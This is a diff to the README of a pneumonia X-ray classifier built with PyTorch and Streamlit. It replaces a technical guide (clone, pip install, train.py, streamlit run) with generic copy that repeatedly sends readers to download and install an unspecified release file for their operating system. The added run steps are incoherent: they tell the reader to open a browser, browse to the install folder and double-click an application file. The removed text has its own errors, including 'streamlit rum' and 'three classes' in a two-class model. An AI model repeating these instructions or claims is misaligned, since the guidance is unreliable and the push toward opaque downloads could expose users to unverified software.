@@ -1,234 +1,92 @@
-# Chest X-ray Pneumonia Classification (2-Class: NORMAL vs PNEUMONIA)
+# 🌟 Pneumonia-HybridCNN - Detect Pneumonia from X-rays Easily
 
-This repository contains a deep learning project for **binary classification** of chest X-ray images into:
+[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/nourddinetaqi/Pneumonia-HybridCNN/releases)
 
-- **NORMAL**
-- **PNEUMONIA**
+## 📖 Overview
 
-The system is built using **PyTorch**, includes a **custom Hybrid CNN with Residual Blocks**, and provides a fully interactive **Streamlit web application** with **Grad-CAM visualization** for model interpretability.
+Welcome to the Pneumonia-HybridCNN project. This software uses a custom hybrid model that combines Convolutional Neural Networks (CNN) and ResNet to detect Pneumonia from chest X-ray images. The project comes with a user-friendly Streamlit web app, allowing you to upload X-ray images and visualize the results. Please note, this tool is designed for educational purposes and is not intended for clinical or diagnostic use.
 
-**Important:**  
-This project is for **educational and research purposes only**.  
-It is **not intended for clinical or medical diagnosis**.  
-Always consult licensed medical professionals for medical interpretation of radiological images.
+## 🚀 Getting Started
 
+Follow these steps to download and run the Pneumonia-HybridCNN application.
 
----
+### 1. System Requirements
 
-## Repository Structure
+Before you start, ensure your system meets these requirements:
 
+- **Operating System:** Windows, macOS, or Linux
+- **Memory:** At least 4 GB of RAM
+- **Internet Connection:** A stable Internet connection for downloading files
+- **Browser:** A modern web browser (e.g., Chrome, Firefox, Safari)
 
-```bash
-Pneumonia-HybridCNN/
-│
-├── model.py # Hybrid CNN + Residual Blocks + GradCAM
-├── train.py # Full training script
-├── app.py # Streamlit web application
-├── requirements.txt # Python dependencies
-├── environment.yml # Conda environment (optional)
-├── README.md # Documentation
-│
-└── data/
-├── train/
-│ ├── NORMAL/
-│ └── PNEUMONIA/
-└── test/
-├── NORMAL/
-└── PNEUMONIA/
-```
+### 2. Download & Install
 
----
+To get the application, visit the releases page below:
 
-## Features
+[Visit this page to download](https://github.com/nourddinetaqi/Pneumonia-HybridCNN/releases)
 
-### Hybrid CNN Architecture
+1. Click on the release version (e.g., **v1.0**) to find the latest version.
+2. Download the file that matches your operating system.
+3. Once the download completes, locate the file (usually in your Downloads folder).
+4. Follow any prompts to install the application.
 
-The model combines:
-- Deep convolutional layers  
-- Residual skip connections  
-- Adaptive pooling  
-- A fully-connected classification head  
+### 3. Running the Application
 
-This structure enables strong feature extraction while avoiding vanishing gradients.
+After you complete the installation, follow these steps:
 
-### Grad-CAM Explainability
+1. Open your web browser.
+2. Navigate to the directory where you installed the application.
+3. Double-click on the application file to launch the Streamlit web app.
+4. Wait a few moments while the application initializes.
 
-The project includes a Grad-CAM implementation that generates:
-- Heatmaps highlighting important regions
-- Overlays on top of the original X-ray
-- Layer selection for deeper inspection
+### 4. Using the Application
 
-### Streamlit Web Application
+Now that the application is running, you can start using it:
 
-The included Streamlit interface provides:
-- Image upload  
-- Model prediction and class probabilities  
-- Confidence indicators  
-- Grad-CAM visualization  
-- Medical disclaimers  
-- Layer selection for interpretability  
-- Side-by-side comparison views  
+1. **Upload an Image:**
+   - Click on the "Upload" button.
+   - Select a chest X-ray image from your files.
+   
+2. **View the Result:**
+   - After uploading, the application processes the image.
+   - It will display whether Pneumonia is detected and provide a visualization of the process using Grad-CAM.
 
-### Two-Class Disease Detection
+### 5. Features
 
-The model classifies:
-- Normal  
-- Pneumonia  
+- **Automated Detection:** Quickly assesses chest X-ray images for Pneumonia.
+- **Interactive Visualization:** Use Grad-CAM to see how the model makes decisions based on the images.
+- **User-Friendly Interface:** Designed for ease of use with simple navigation.
 
+## 📥 Important Links
 
-Works with any dataset that follows the proper folder structure.
+For additional resources, refer to the following links:
 
----
+- [Releases Page](https://github.com/nourddinetaqi/Pneumonia-HybridCNN/releases)
+- [Project Documentation](https://github.com/nourddinetaqi/Pneumonia-HybridCNN) (for more technical details)
 
-## Installation
+## 🔧 Troubleshooting
 
-### Clone the repository:
+If you encounter any issues while using the application, consider these common solutions:
 
-```bash
-git clone https://github.com/yourusername/Pneumonia-HybridCNN.git
-cd Pneumonia-HybridCNN
-```
+- **Application Won't Start:** Ensure that your system meets the requirements listed above. Restart your device and try again.
+- **Image Upload Fails:** Verify that the file format is supported. The application generally accepts JPEG and PNG formats.
+- **Slow Performance:** Close any unnecessary applications running in the background to optimize your system’s memory usage.
 
-### Install dependencies:
+## 📝 Contribution 
 
-```bash
-pip install -r requirements.txt
-```
+This project welcomes contributions. If you have suggestions or want to help improve the software, feel free to submit an issue or a pull request on GitHub.
 
-OR
+## 🌍 Community & Support
 
-```bash
-conda env create -f environment.yml
-conda activate pneumonia_cnn_env
-```
+Join our community for support and discussions about Pneumonia detection and deep learning:
 
-### Data
+- Visit relevant forums, online communities, or social media groups that focus on medical imaging and deep learning.
+- Share your experiences and learn from others working with similar tools.
 
-The data can be pulled from Kaggle:
-https://www.kaggle.com/datasets/paultimothymooney/chest-xray-pneumonia
+## 📜 License
 
----
+This project is licensed under the MIT License. You may use, modify, and distribute it as permitted by the license.
 
-## Dataset Preparation
+Your journey into the world of medical imaging begins here! Enjoy exploring and using the Pneumonia-HybridCNN project. If you have any questions or feedback, please reach out through the issues section on our GitHub page. 
 
-Your dataset must be strucutred as following:
-
-```bash
-data/train/NORMAL/
-data/train/PNEUMONIA/
-
-data/val/NORMAL/
-data/val/PNEUMONIA/
-
-data/test/NORMAL/
-data/test/PNEUMONIA/
-
-```
-
-Supported formats: (.jpg, .jpeg, .png)
-the training script automatically splits validation data from the training set.
-
----
-
-## Training
-
-Run:
-
-```bash
-python train.py
-```
-
-What happens during training:
-- Data augmentation
-- Class weighting for imbalance
-- Learning rate scheduling
-- Early stopping
-- Best-model checkpointing
-- Epoch-level performance reporting
-- Test-set evaluation (confusion matrix + classification report)
-
----
-
-## Running the Streamlit Application
-
-Start the app:
-
-```bash
-streamlit rum app.py
-```
-
-Once launched, the interface allows you to:
-- Upload a chest X-ray
-- Generate predictions
-- View per-class probabilities
-- Inspect Grad-CAM heatmaps
-- Switch Grad-CAM layers
-- See educational disclaimers on every important step
-
----
-
-## Model Performance
-
-In typical training runs, the model achieves:
-- About 96% overall accuracy
-- Balanced performance across all three classes
-- Strong recall for Pneumonia.
-- Smooth generalization due to augmentation and class weighting
-
-Performance depends on dataset composition and size.
-
----
-
-## File Descriptions
-
-### model.py
-
-- HybridPneumoniaCNN model class
-- ResidualBlock implementation
-- Grad-CAM generation utilities
-
-### train.py
-
-- Train/validation/test loops
-- Augmentation and dataset loaders
-- Weighted loss
-- Scheduler and early stopping
-- Model saving and evaluation
-
-### app.py
-
-- Image loading and preprocessing
-- Model inference
-- Bar-graph probabilities
-- Gradient-based heatmaps
-- Color-coded confidence warnings
-- Educational disclaimers
-
-### requirements.txt
-
-List of packages required for training and deployment.
-
----
-
-## Contributing
-
-Contributing
-
-Contributions are welcome.
-
-Possible improvements:
-- Faster model variants
-- Additional explainability methods
-- Deployment scripts
-- UI enhancements
-- Support for more datasets
-
-Submit a pull request or open an issue for discussion.
-
----
-
-## Final Note
-
-This repository is intended solely for educational experimentation with deep learning, medical imaging, model interpretability, and web deployment.
-
-It is not a clinical diagnostic tool under any circumstances.
+[Download Now](https://github.com/nourddinetaqi/Pneumonia-HybridCNN/releases) and start using the application today!
